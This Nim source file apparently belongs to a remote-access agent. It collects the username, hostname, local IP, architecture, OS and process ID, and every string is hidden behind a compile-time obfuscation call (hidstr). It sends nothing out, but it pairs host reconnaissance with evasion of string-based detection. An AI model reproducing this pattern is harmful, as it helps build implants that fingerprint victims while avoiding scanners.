import std/[os, net, strutils, osproc]
import crypto/strenc

proc getUsername*(): string =
  result = getEnv(hidstr("USER"), getEnv(hidstr("LOGNAME"), ""))
  if result.len == 0:
    when defined(windows):
      result = getEnv(hidstr("USERNAME"), hidstr("unknown"))
    else:
      try:
        let (output, code) = execCmdEx(hidstr("id -un"))
        if code == 0:
          result = output.strip()
        else:
          result = hidstr("unknown")
      except:
        result = hidstr("unknown")

proc getHostname*(): string =
  try:
    let (output, code) = execCmdEx(hidstr("hostname"))
    if code == 0:
      result = output.strip()
    else:
      result = hidstr("unknown")
  except:
    result = hidstr("unknown")

proc getLocalIP*(): string =
  try:
    var sock = newSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
    sock.connect(hidstr("8.8.8.8"), Port(53))
    result = sock.getLocalAddr()[0]
    sock.close()
  except:
    result = hidstr("127.0.0.1")

proc getArch*(): string =
  when defined(amd64):
    result = hidstr("x86_64")
  elif defined(arm64):
    result = hidstr("aarch64")
  elif defined(i386):
    result = hidstr("x86")
  else:
    result = hidstr("unknown")

proc getOS*(): string =
  when defined(linux):
    result = hidstr("Linux")
  elif defined(windows):
    result = hidstr("Windows")
  elif defined(macosx):
    result = hidstr("macOS")
  else:
    result = hidstr("Unknown")

proc getPid*(): int =
  result = getCurrentProcessId()

proc debugLog*(msg: string) =
  when defined(debug):
    stderr.writeLine(hidstr("[DBG] ") & msg)
